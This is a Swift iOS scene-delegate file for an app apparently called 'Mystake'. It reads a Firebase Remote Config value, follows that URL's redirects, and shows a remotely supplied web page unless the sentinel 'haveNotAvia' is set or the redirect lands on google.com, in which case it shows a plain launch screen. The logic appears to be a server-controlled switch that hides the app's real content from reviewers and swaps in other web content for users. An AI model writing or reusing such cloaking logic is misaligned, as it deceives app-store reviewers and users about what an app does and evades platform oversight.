//
//  SceneDelegate.swift
//  Mystake
//
//  Created by Vladko on 16.01.2024.
//

import UIKit
import FirebaseRemoteConfig

class SceneDelegate: UIResponder, UIWindowSceneDelegate {

    /// Window
    var window: UIWindow?

    /// Scene will connect to session
    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
        guard let windowScene = (scene as? UIWindowScene) else { return }
        
        let window = UIWindow(windowScene: windowScene)
        self.window = window
        
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        
        let remoteConfig = RemoteConfig.remoteConfig()
        remoteConfig.configSettings = settings
        
        let launchController = ViewController()
        launchController.view.backgroundColor = .background1
        
        window.rootViewController = launchController
        window.makeKeyAndVisible()
        
        // Fetch remote configurations
        remoteConfig.fetch(withExpirationDuration: 0) { [self] a1,a2 in
            remoteConfig.activate()
            
            // Fetch value
            let value = remoteConfig.configValue(forKey: "value")
            let valueString = value.stringValue ?? ""
            let valueUrl = URL(string: valueString)
            
            if valueString != "haveNotAvia", let valueUrl {
                getRedirectURL(from: valueUrl) { [self] url in
                    if let url, !url.absoluteString.contains("google.com") {
                        showRemoteController(source: url.absoluteString)
                    } else {
                        showLaunchController()
                    }
                }
            } else {
                showLaunchController()
            }
        }
    }

}

// MARK: - Flow
extension SceneDelegate {
    
    /// Show launch controller
    private func showLaunchController() {
        showController(LaunchViewController())
    }
    
    /// Show launch controller
    private func showRemoteController(source: String) {
        showController(RemoteViewController(source: source))
    }
    
    /// Show controller
    private func showController(_ controller: UIViewController) {
        let rootViewController = UINavigationController()
        rootViewController.isNavigationBarHidden = true
        rootViewController.viewControllers = [controller]
        
        window?.rootViewController = rootViewController
        window?.makeKeyAndVisible()
    }
    
}

// MARK: - Private actions
extension SceneDelegate {
    
    /// Get redirect link
    private func getRedirectURL(from initialURL: URL, completion: @escaping (URL?) -> Void) {
        var request = URLRequest(url: initialURL)
        request.httpMethod = "HEAD"

        let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
            DispatchQueue.main.async {
                if let httpResponse = response as? HTTPURLResponse {
                    if let finalURL = httpResponse.url {
                        completion(finalURL)
                    } else {
                        completion(nil)
                    }
                } else {
                    completion(nil)
                }
            }
        }

        task.resume()
    }
    
}
